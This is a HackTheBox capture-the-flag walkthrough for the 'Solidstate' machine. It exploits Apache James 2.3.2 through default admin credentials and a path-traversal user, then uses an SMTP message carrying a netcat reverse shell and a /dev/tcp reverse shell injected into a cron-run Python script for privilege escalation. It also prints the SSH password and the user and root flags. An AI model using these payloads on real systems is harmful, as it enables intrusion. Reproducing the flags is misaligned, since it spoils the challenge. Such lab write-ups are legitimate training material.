# HackTheBox : Solidstate

```James Server 2.3.2```
https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf


```zsh
telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:                                                                                                                                                                   
root                                                                                                                                                                        
Password:                                                                                                                                                                   
root                                                                                                                                                                        
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d pass
User ../../../../../../../../etc/bash_completion.d added
QUIT
```



```zsh
telnet 10.10.10.51 25                                                                              
Trying 10.10.10.51...                                                                                   
Connected to 10.10.10.51.                                                                               
Escape character is '^]'.                                                                               
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 7 Jun 2020 06:30:30 -0400 (EDT)         
EHLO someone@mydomain                                                                                   
250-solidstate Hello someone@mydomain (10.10.14.11 [10.10.14.11])                                       
250-PIPELINING                                                                                          
250 ENHANCEDSTATUSCODES                                                                                 
MAIL FROM:<'you@domain.com>                                                          
250 2.1.0 Sender <'you@domain.com> OK

RCPT TO:<../../../../../../../../etc/bash_completion.d>                                                                                                                     
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK                                                                                            
DATA                                       
354 Ok Send data ending with <CRLF>.<CRLF>                                            
FROM: someone@yourdomain 
354 Ok Send data ending with <CRLF>.<CRLF>                                            
FROM: somone@mydomain.com                  
'                                          
/bin/nc -e /bin/bash 10.10.14.11 443                                                  
.                                          
250 2.6.0 Message received                                                            
QUIT                  
'                                          
```
Read the mails in the POP server port 110 for mindy and get ssh creds

```
ssh -P P@55W0rd1!2@ mindy@10.10.10.51
```


Try to add this in ```opt/tmp.py ``` which runs every 3 minute


bash -i >& /dev/tcp/10.10.14.11/444 0>&1

echo "os.system('bash -c "bash -i >& /dev/tcp/10.10.14.11/444 0>&1"')" >> tmp.py

user flag: 914d0a4ebc177889b5b89a23f556fd75
root flag: b4c9723a28899b1c45db281d99cc87c9